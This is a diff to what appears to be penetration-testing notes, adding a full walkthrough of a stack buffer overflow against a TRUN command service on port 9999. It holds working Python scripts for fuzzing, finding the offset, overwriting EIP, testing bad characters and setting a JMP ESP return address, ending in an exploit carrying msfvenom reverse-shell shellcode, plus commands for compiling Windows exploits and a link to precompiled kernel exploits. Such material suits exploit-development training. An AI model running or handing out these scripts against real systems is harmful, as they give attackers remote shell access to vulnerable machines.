@@ -2793,33 +2793,212 @@ else
     JAWS-ENUM
     }
 ```
+## stack buffer overflow without aslr/dep/seh
 
+- fuzzing
+- finding the offset
+- overwriting the eip
+- finding bad characters
+- finding the right module
+- generating shellcode -> root
 
+### fuzz.py
 
-
-
-
-
-
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
 ```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = "A"*100
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('<IP>',<port>))
+                
+                s.send(('TRUN /.:/'+buffer)) #trun command
+                s.close()
+                sleep(1)
+                buffer=buffer+"A"*100
+                
+        except:
+                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                sys.exit()
+```
+
+### offset.py
+
+- /usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 5000
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af>
+
+
+try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.110',9999))
+
+                s.send(('TRUN /.:/'+ offset)) 
+                s.close()
+
+
+except:
+                print "Error Connecting to server"
+                sys.exit()
+```
+
+### overwrite.py
+
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+shellcode = "A"*2003 + "B"*4
+
+
+try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.110',9999))
+                
+                s.send(('TRUN /.:/'+ shellcode)) #trun command
+                s.close()
+
+                
+except:
+                print "Error connecting to server"
+                sys.exit()
+```
+
+### badchars.py
+
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+shellcode = "A"*2003 + "B"*4 +badchars
+
+
+try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.110',9999))
+                
+                s.send(('TRUN /.:/'+ shellcode)) #trun command
+                s.close()
+
+                
+except:
+                print "Error connecting to server"
+                sys.exit()
+```
+### module.py
+
+- use !mona jmp -r esp to find the hex value to overwrite on the EIP
+- !mona modules to select the right module without memory protections
+- view modules -> find command JMP ESP (FFE4)
+- little endian rules
+
+```
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+shellcode = "A"*2003 + "\xaf\x11\x50\x62" #this could be different (little endian)
+
+
+try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.110',9999))
+                
+                s.send(('TRUN /.:/'+ shellcode)) #trun command
+                s.close()
+
+                
+except:
+                print "Error connecting to server"
+                sys.exit()
+```
+
+### shellcode.py
+
+- generate shellcode with
+
+```
+msfvenom -p windows/shell_reverse_tcp -lhost=yourip -lport=yourport -f c -a x86 EXITFUNC=thread -b "\x00(badchars)"
+```
+```
+  GNU nano 4.9.3     shellcode.py                
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+overflow = ("\xda\xcf\xd9\x74\x24\xf4\xba\xcb\xe>
+"\x52\x83\xe8\xfc\x31\x50\x13\x03\x9b\xf1\x14\x6>
+"\x92\x17\xdf\x3b\x1a\xf2\xee\x7b\x78\x77\x40\x4>
+"\x27\x5e\xcd\xe6\x45\x77\xe2\x4f\xe3\xa1\xcd\x5>
+"\xd3\xa3\xc6\xae\xea\x6b\x1b\xaf\x2b\x91\xd6\xf>
+"\x11\x80\xa8\x55\x9a\xda\x3d\xde\x7f\xaa\x3c\xc>
+"\xcf\xd1\x65\x13\x46\xc9\x6a\x1e\x10\x62\x58\xd>
+"\x15\x0f\x8b\x1c\xe4\x51\xcc\x9b\x17\x24\x24\xd>
+"\xa2\x70\xb5\xe7\x05\xf2\x6d\xc3\xb4\xd7\xe8\x8>
+"\xce\xdf\x23\x53\x65\xdb\xa8\x52\xa9\x6d\xea\x7>
+"\x19\x34\x93\x1f\x25\x26\x7c\xff\x83\x2d\x91\x1>
+"\xd9\xf3\x8e\xfe\x75\x83\xfd\xcc\xda\x3f\x69\x7>
+"\x82\x89\x5e\xe0\x7d\x32\x9f\x29\xba\x66\xcf\x4>
+"\x91\x94\xd2\x0b\xc1\x3a\x8d\xeb\xb1\xfa\x7d\x8>
+"\xb4\xe4\xde\xca\x5f\x1f\x89\x34\x37\x1e\x25\xd>
+"\x41\xc2\xc6\xac\x69\x82\x51\x59\x13\x8f\x29\xf>
+"\x3a\x56\xaa\xa9\xf5\x9f\xc7\xb9\x62\x50\x92\xe>
+"\x8b\xaa\xe2\xd7\x4b\xa4\x1e\x40\x1c\xe1\xd1\x9>
+"\x30\xee\xdd\x0d\x7b\xaa\x39\xee\x82\x33\xcf\x4>
+"\x52\xed\x17\xc5\x05\xbb\xc1\xa3\xff\x0d\xbb\x7>
+"\xfb\x9f\xd7\x2d\x04\xca\xa1\xd1\xb5\xa3\xf7\xe>
+"\x97\x66\xd4\xff\x42\x23\xf4\x1d\x46\x5e\x9d\xb>
+"\x3b\xfe\x20\xfd\xbf\x0a\xd9\xfa\xa0\x7f\xdc\x4>
+"\xd8\x02\x92\x03\xd8\x06")
+
+shellcode = "A"*2003 + "\xaf\x11\x50\x62" +"\x90"*32 +overflow
+
+
+try:
+                s=socket.socket(socket.AF_INET,s>
+                s.connect(('192.168.1.110',9999))
+
+                s.send(('TRUN /.:/'+ shellcode))
+                s.close()
+
+except:
+                print "Error Connecting"
+                sys.exit()
+
+
+
+```
+
+## compiling exploits
+
+- compiling windows exploits
+
+```
+i686-w64-mingw32-gcc exploit.c -o exploit
+```
+
+- for 32 bit
+
+```
+i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
+```
+- [precompiled windows-kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)
